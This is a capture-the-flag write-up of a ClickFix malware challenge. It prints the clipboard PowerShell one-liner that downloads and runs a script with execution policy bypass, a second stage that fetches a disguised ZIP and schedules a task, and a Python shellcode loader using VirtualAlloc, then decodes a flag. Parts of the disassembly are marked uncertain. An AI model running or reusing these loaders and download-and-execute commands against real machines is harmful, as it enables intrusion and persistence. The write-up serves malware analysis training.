@@ -1,0 +1,222 @@
+<h1 id="-verify-you-are-human">🐞 Verify You Are Human</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Category</th>
+      <th>Author</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>🐞 Malware</td>
+      <td>John Hammond</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="challenge-prompt">Challenge Prompt</h2>
+
+<p>My computer said I needed to update MS Teams, so that is what I have been trying to do…</p>
+
+<p>…but I can’t seem to get past this CAPTCHA!</p>
+
+<blockquote>
+  <p>[!CAUTION]
+This is the <code class="language-plaintext highlighter-rouge">Malware</code> category, and as such, includes malware.
+Please be sure to analyze these files within an isolated virtual machine.</p>
+</blockquote>
+
+<blockquote>
+  <p>[!NOTE]
+Some components of this challenge may be finicky with the browser-based connection. You can still achieve what you need to, but there may be some more extra steps than if you were to approach this over the VPN.</p>
+  <blockquote>
+    <p>(i.e., “remove the port” when you need to… you’ll know what I mean 😜)</p>
+  </blockquote>
+</blockquote>
+
+<h2 id="problem-type">Problem Type</h2>
+<ul>
+  <li>Clickfix</li>
+  <li>PowerShell Malware</li>
+  <li>Python Malware</li>
+</ul>
+
+<h2 id="solve">Solve</h2>
+<p>Click the CAPTCHA<br />
+It loads a new page and you now have code in your clipboard<br />
+Paste to a txt doc</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe"</span><span class="w"> </span><span class="nt">-Wi</span><span class="w"> </span><span class="n">HI</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$UkvqRHtIr</span><span class="s2">=</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">LocalAppData</span><span class="s2">+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://52daaa57.proxy.coursestack.com:443/?tic=1'&gt; </span><span class="nv">$UkvqRHtIr</span><span class="s2">;powershell -Wi HI -ep bypass -f </span><span class="nv">$UkvqRHtIr</span><span class="s2">"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>See the next hop to <code class="language-plaintext highlighter-rouge">/?tic=1</code>, navigate there and grab the code:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$JGFDGMKNGD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">char</span><span class="p">]</span><span class="mi">46</span><span class="p">)</span><span class="o">+</span><span class="p">([</span><span class="n">char</span><span class="p">]</span><span class="mi">112</span><span class="p">)</span><span class="o">+</span><span class="p">([</span><span class="n">char</span><span class="p">]</span><span class="mi">121</span><span class="p">)</span><span class="o">+</span><span class="p">([</span><span class="n">char</span><span class="p">]</span><span class="mi">99</span><span class="p">);</span><span class="nv">$HMGDSHGSHSHS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">guid</span><span class="p">]::</span><span class="n">NewGuid</span><span class="p">();</span><span class="nv">$OIEOPTRJGS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">LocalAppData</span><span class="p">;</span><span class="n">irm</span><span class="w"> </span><span class="s1">'http://52daaa57.proxy.coursestack.com:443/?tic=2'</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$OIEOPTRJGS</span><span class="nx">\</span><span class="nv">$HMGDSHGSHSHS</span><span class="o">.</span><span class="nf">pdf</span><span class="p">;</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.IO.Compression.FileSystem</span><span class="p">;[</span><span class="n">System.IO.Compression.ZipFile</span><span class="p">]::</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="s2">"</span><span class="nv">$OIEOPTRJGS</span><span class="s2">\</span><span class="nv">$HMGDSHGSHSHS</span><span class="s2">.pdf"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="nv">$OIEOPTRJGS</span><span class="s2">\</span><span class="nv">$HMGDSHGSHSHS</span><span class="s2">"</span><span class="p">);</span><span class="nv">$PIEVSDDGs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nv">$OIEOPTRJGS</span><span class="w"> </span><span class="nv">$HMGDSHGSHSHS</span><span class="p">;</span><span class="nv">$WQRGSGSD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$HMGDSHGSHSHS</span><span class="s2">"</span><span class="p">;</span><span class="nv">$RSHSRHSRJSJSGSE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$PIEVSDDGs</span><span class="s2">\pythonw.exe"</span><span class="p">;</span><span class="nv">$RYGSDFSGSH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$PIEVSDDGs</span><span class="s2">\cpython-3134.pyc"</span><span class="p">;</span><span class="nv">$ENRYERTRYRNTER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskAction</span><span class="w"> </span><span class="nt">-Execute</span><span class="w"> </span><span class="nv">$RSHSRHSRJSJSGSE</span><span class="w"> </span><span class="nt">-Argument</span><span class="w"> </span><span class="s2">"</span><span class="se">`"</span><span class="nv">$RYGSDFSGSH</span><span class="se">`"</span><span class="s2">"</span><span class="p">;</span><span class="nv">$TDRBRTRNREN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-Date</span><span class="p">)</span><span class="o">.</span><span class="nf">AddSeconds</span><span class="p">(</span><span class="nx">180</span><span class="p">);</span><span class="nv">$YRBNETMREMY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskTrigger</span><span class="w"> </span><span class="nt">-Once</span><span class="w"> </span><span class="nt">-At</span><span class="w"> </span><span class="nv">$TDRBRTRNREN</span><span class="p">;</span><span class="nv">$KRYIYRTEMETN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskPrincipal</span><span class="w"> </span><span class="nt">-UserId</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="s2">"</span><span class="w"> </span><span class="nt">-LogonType</span><span class="w"> </span><span class="nx">Interactive</span><span class="w"> </span><span class="nt">-RunLevel</span><span class="w"> </span><span class="nx">Limited</span><span class="p">;</span><span class="n">Register-ScheduledTask</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="nv">$WQRGSGSD</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nv">$ENRYERTRYRNTER</span><span class="w"> </span><span class="nt">-Trigger</span><span class="w"> </span><span class="nv">$YRBNETMREMY</span><span class="w"> </span><span class="nt">-Principal</span><span class="w"> </span><span class="nv">$KRYIYRTEMETN</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="n">Set-Location</span><span class="w"> </span><span class="nv">$PIEVSDDGs</span><span class="p">;</span><span class="nv">$WMVCNDYGDHJ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"cpython-3134"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$JGFDGMKNGD</span><span class="p">;</span><span class="w"> </span><span class="n">Rename-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"cpython-3134"</span><span class="w"> </span><span class="nt">-NewName</span><span class="w"> </span><span class="nv">$WMVCNDYGDHJ</span><span class="p">;</span><span class="w"> </span><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="s1">'rundll32 shell32.dll,ShellExec_RunDLL "'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$PIEVSDDGs</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\pythonw" "'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$PIEVSDDGs</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\'</span><span class="o">+</span><span class="w"> </span><span class="nv">$WMVCNDYGDHJ</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'"'</span><span class="p">);</span><span class="n">Remove-Item</span><span class="w"> </span><span class="bp">$MyInvocation</span><span class="o">.</span><span class="nf">MyCommand</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="n">Set-Clipboard</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Review this code and notice next hop is <code class="language-plaintext highlighter-rouge">/?tic=2</code>
+It is also running a decompression function on the PDF, so it is really a ZIP file.</p>
+
+<p>Download the file from /?tic=2<br />
+Use 7zip to extract (<code class="language-plaintext highlighter-rouge">7z e document.pdf</code>)</p>
+
+<p>Review file Output.py</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
+
+<span class="nf">exec</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="sh">'</span><span class="s">aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp</span><span class="sh">'</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>This has Base64 encoded text.<br />
+Copy to Cyber Chef and decode from Base64:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">ctypes</span> 
+
+<span class="k">def</span> <span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">,</span> <span class="n">key_bytes</span><span class="p">):</span> 
+	<span class="n">decrypted_bytes</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">()</span> 
+	<span class="n">key_length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">)</span> 
+	
+	<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">):</span> 
+		<span class="n">decrypted_byte</span> <span class="o">=</span> <span class="n">byte</span> <span class="o">^</span> <span class="n">key_bytes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_length</span><span class="p">]</span>
+		<span class="n">decrypted_bytes</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">decrypted_byte</span><span class="p">)</span> 
+		<span class="k">return</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">decrypted_bytes</span><span class="p">)</span> 
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="sh">'</span><span class="s">zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ==</span><span class="sh">'</span><span class="p">),</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="sh">'</span><span class="s">me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==</span><span class="sh">'</span><span class="p">)))</span> 
+
+<span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span><span class="p">.</span><span class="nc">VirtualAlloc</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="nf">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">ctypes</span><span class="p">.</span><span class="nf">c_int</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span> <span class="n">ctypes</span><span class="p">.</span><span class="nf">c_int</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">),</span> <span class="n">ctypes</span><span class="p">.</span><span class="nf">c_int</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span> 
+<span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_char</span> <span class="o">*</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)).</span><span class="nf">from_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> 
+
+<span class="n">ctypes</span><span class="p">.</span><span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span><span class="p">.</span><span class="nc">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="nf">c_int</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="nf">c_int</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span> 
+
+<span class="n">functype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="nc">CFUNCTYPE</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_void_p</span><span class="p">)</span> 
+<span class="n">fn</span> <span class="o">=</span> <span class="nf">functype</span><span class="p">(</span><span class="n">ptr</span><span class="p">)</span> 
+<span class="nf">fn</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Copy the <code class="language-plaintext highlighter-rouge">import</code> <code class="language-plaintext highlighter-rouge">def xor_decrypt</code> and the <code class="language-plaintext highlighter-rouge">shellcode =</code> lines and paste to a .py file<br />
+Add <code class="language-plaintext highlighter-rouge">import base64</code> to the first line<br />
+Add <code class="language-plaintext highlighter-rouge">print(shellcode)</code> to the last line<br />
+Run the script<br />
+Python3 script.py &gt; out.txt:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">U</span><span class="se">\x89\xe5\x81\xec\x80\x00\x00\x00</span><span class="s">h</span><span class="se">\x93\xd8\x84\x84</span><span class="s">h</span><span class="se">\x90\xc3\xc6\x97</span><span class="s">h</span><span class="se">\xc3\x90\x93\x92</span><span class="s">h</span><span class="se">\x90\xc4\xc3\xc7</span><span class="s">h</span><span class="se">\x9c\x93\x9c\x93</span><span class="s">h</span><span class="se">\xc0\x9c\xc6\xc6</span><span class="s">h</span><span class="se">\x97\xc6\x9c\x93</span><span class="s">h</span><span class="se">\x94\xc7\x9d\xc1</span><span class="s">h</span><span class="se">\xde\xc1\x96\x91</span><span class="s">h</span><span class="se">\xc3\xc9\xc4\xc2\xb9\n\x00\x00\x00\x89\xe7\x81</span><span class="s">7</span><span class="se">\xa5\xa5\xa5\xa5\x83\xc7\x04</span><span class="s">Iu</span><span class="se">\xf4\xc6</span><span class="s">D$&amp;</span><span class="se">\x00\xc6\x85\x7f\xff\xff\xff\x00\x89\xe6\x8d</span><span class="s">}</span><span class="se">\x80\xb9</span><span class="s">&amp;</span><span class="se">\x00\x00\x00\x8a\x06\x88\x07</span><span class="s">FGIu</span><span class="se">\xf7\xc6\x07\x00\x8d</span><span class="s">&lt;$</span><span class="se">\xb9</span><span class="s">@</span><span class="se">\x00\x00\x00\xb0\x01\x88\x07</span><span class="s">GIu</span><span class="se">\xfa\xc9\xc3</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Paste shellcode to chatGPT and ask it to disassemble in x86</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x1000: 55                      push   ebp
+0x1001: 89 e5                   mov    ebp,esp
+0x1003: 81 ec 80 00 00 00       sub    esp,0x80          ; allocate 0x80 bytes stack frame
+0x1009: 68 93 d8 84 84          push   0x8484d893        ; immediate push (likely pointer/data)
+0x100e: 68 90 c3 c6 97          push   0x97c6c390
+0x1013: 68 c3 90 93 92          push   0x929390c3
+0x1018: 68 90 c4 c3 c7          push   0xc7c3c490
+0x101d: 68 9c 93 9c 93          push   0x939c939c
+0x1022: 68 c0 9c c6 c6          push   0xc6c69cc0
+0x1027: 68 97 c6 9c 93          push   0x939cc697
+0x102c: 68 94 c7 9d c1          push   0xc19dc794
+0x1031: 68 de c1 96 91          push   0x9196c1de
+0x1036: 68 c3 c9 c4 c2          push   0xc2c4c9c3
+0x103b: b9 0a 00 00 00          mov    ecx,0xa
+0x1040: 89 e7                   mov    edi,esp
+0x1042: 81 37 a5 a5 a5 a5       xchg   DWORD PTR [edi],esp  ; (0x81 37 is actually cmp? see note)
+                                       ; **Note**: 0x81 /7 with modrm 0x37 is "xor" family depending on opcode; this encoding is odd here.
+                                       ; Best interpretation: opcode 81 37 imm32 =&gt; xchg or cmp? (uncertain)
+0x1048: 83 c7 04                add    edi,0x4
+0x104b: 49                      dec    ecx
+0x104c: 75 f4                   jne    0x1042            ; loop back if not zero (f4 is negative displacement -12)
+0x104e: c6 44 24 26 00          mov    BYTE PTR [esp+0x26],0x0
+0x1053: c6 85 7f ff ff ff 00    mov    BYTE PTR [ebp-0x81],0x0
+0x105a: 89 e6                   mov    esi,esp
+0x105c: 8d 7d 80                lea    edi,[ebp-0x80]
+0x105f: b9 26 00 00 00          mov    ecx,0x26
+0x1064: 8a 06                   mov    al,BYTE PTR [esi]
+0x1066: 88 07                   mov    BYTE PTR [edi],al
+0x1068: 46                      inc    esi
+0x1069: 47                      inc    edi
+0x106a: 49                      dec    ecx
+0x106b: 75 f7                   jne    0x1064
+0x106d: c6 07 00                mov    BYTE PTR [edi],0x0
+0x1070: 8d 3c 24                lea    edi,[esp]          ; lea edi, [esp]
+0x1073: b9 40 00 00 00          mov    ecx,0x40
+0x1078: b0 01                   mov    al,0x1
+0x107a: 88 07                   mov    BYTE PTR [edi],al
+0x107c: 47                      inc    edi
+0x107d: 49                      dec    ecx
+0x107e: 75 fa                   jne    0x107a
+0x1080: c9                      leave
+0x1081: c3                      ret
+</code></pre></div></div>
+
+<p>Ask it to run the <code class="language-plaintext highlighter-rouge">push imm32</code> values and <code class="language-plaintext highlighter-rouge">xor</code> with the <code class="language-plaintext highlighter-rouge">A5</code>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Original</th>
+      <th>XOR’d</th>
+      <th>ASCII</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0x8484d893</td>
+      <td>0x21217d36</td>
+      <td><code class="language-plaintext highlighter-rouge">6}!!</code></td>
+    </tr>
+    <tr>
+      <td>0x97c6c390</td>
+      <td>0x32636635</td>
+      <td><code class="language-plaintext highlighter-rouge">5fc2</code></td>
+    </tr>
+    <tr>
+      <td>0x929390c3</td>
+      <td>0x37363566</td>
+      <td><code class="language-plaintext highlighter-rouge">f567</code></td>
+    </tr>
+    <tr>
+      <td>0xc7c3c490</td>
+      <td>0x62666135</td>
+      <td><code class="language-plaintext highlighter-rouge">5afb</code></td>
+    </tr>
+    <tr>
+      <td>0x939c939c</td>
+      <td>0x36393639</td>
+      <td><code class="language-plaintext highlighter-rouge">9696</code></td>
+    </tr>
+    <tr>
+      <td>0xc6c69cc0</td>
+      <td>0x63633965</td>
+      <td><code class="language-plaintext highlighter-rouge">e9cc</code></td>
+    </tr>
+    <tr>
+      <td>0x939cc697</td>
+      <td>0x36396332</td>
+      <td><code class="language-plaintext highlighter-rouge">2c96</code></td>
+    </tr>
+    <tr>
+      <td>0xc19dc794</td>
+      <td>0x64386231</td>
+      <td><code class="language-plaintext highlighter-rouge">1b8d</code></td>
+    </tr>
+    <tr>
+      <td>0x9196c1de</td>
+      <td>0x3433647b</td>
+      <td><code class="language-plaintext highlighter-rouge">{d34</code></td>
+    </tr>
+    <tr>
+      <td><strong>0xc2c4c9c3</strong></td>
+      <td><strong>0x67616c66</strong></td>
+      <td><strong><code class="language-plaintext highlighter-rouge">flag</code></strong> ✅</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Beacuse it is 32 bit, it needs reversed.</p>
+
+<hr />
+<p>Saw this tool being used by someone else:</p>
+
+<p>Floss tool for shellcode
+<code class="language-plaintext highlighter-rouge">./floss --format sc32 shellcode.bin (for 32 bit)</code>
+<code class="language-plaintext highlighter-rouge">./floss --format sc64 shellcode.bin (for 64 bit)</code></p>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">flag{d341b8d2c96e9cc96965afbf5675fc26}</code></p>
+
+<p align="right">(<a href="#top">back to top</a>)</p>
